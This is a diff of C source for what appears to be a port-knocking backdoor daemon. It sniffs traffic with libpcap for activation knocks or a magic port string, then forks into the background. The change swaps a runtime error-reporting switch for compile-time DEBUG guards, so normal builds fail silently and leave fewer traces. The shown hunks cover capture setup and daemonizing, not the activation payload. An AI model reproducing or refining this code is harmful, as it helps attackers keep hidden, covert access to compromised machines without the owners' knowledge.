@@ -48,7 +48,7 @@ struct tcphdr {
 };
 
 
-void create_deamon_process(char *cdr_noise_command) {
+void create_deamon_process() {
     char                    pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
     pcap_t                  *cap;                       /* captuer handler */
     bpf_u_int32             network;
@@ -59,19 +59,6 @@ void create_deamon_process(char *cdr_noise_command) {
     struct tcphdr           *tcp;
     unsigned char           *pdata;
     char                    *filter;
-    int                     cdr_noise = 0;
-
-    /* Determines if it will report errors to stderr */
-    if(cdr_noise_command) {
-        if(!strcmp(cdr_noise_command, CDR_NOISE_COMMAND)) {
-            cdr_noise++;
-        } else {
-            #ifdef DEBUG
-                fprintf(stderr, "%s is not an acceptable command line arg\n", cdr_noise_command);
-            #endif
-            exit(0);
-        }
-    }
 
     /* If no activation method is supplied, exit */
 #if (!defined(CDR_PORTS) || !defined(CDR_PORTS_SIZE) || !defined(PORT_KNOCK_LIST)) && !defined(MAGIC_PORT_STRING)
@@ -95,8 +82,9 @@ void create_deamon_process(char *cdr_noise_command) {
 #endif
 
     if (pcap_lookupnet(CDR_INTERFACE,&network,&netmask,pcap_err)!=0) {
-	    if (cdr_noise)
+	    #ifdef DEBUG
 	        fprintf(stderr,"pcap_lookupnet: %s\n",pcap_err);
+        #endif
         free(filter);
 	    exit (0);
     }
@@ -106,22 +94,25 @@ void create_deamon_process(char *cdr_noise_command) {
 		    0,	/*not in promiscuous mode*/
 		    0,  /*no timeout */
 		    pcap_err))==NULL) {
-	    if (cdr_noise)
+	    #ifdef DEBUG
 	        fprintf(stderr,"pcap_open_live: %s\n",pcap_err);
+        #endif
         free(filter);
 	    exit (0);
     }
 
     /* compiles the filter and then sets the filter*/
     if (pcap_compile(cap,&cfilter,filter,0,netmask)!=0) {
-        if (cdr_noise) 
+        #ifdef DEBUG
             capterror(cap,"pcap_compile");
+        #endif
         free(filter);
         exit (0);
     }
     if (pcap_setfilter(cap,&cfilter)!=0) {
-        if (cdr_noise)
+        #ifdef DEBUG
             capterror(cap,"pcap_setfilter");
+            #endif
         free(filter);
         exit (0);
     }
@@ -149,8 +140,9 @@ void create_deamon_process(char *cdr_noise_command) {
     /* create a child process to start a daemon and then exit the parent */
     switch (i=fork()) {
         case -1:
-            if (cdr_noise)
+            #ifdef DEBUG
             fprintf(stderr,"fork() failed\n");
+            #endif
             exit (0);
             break;	/* not reached */
         case 0:
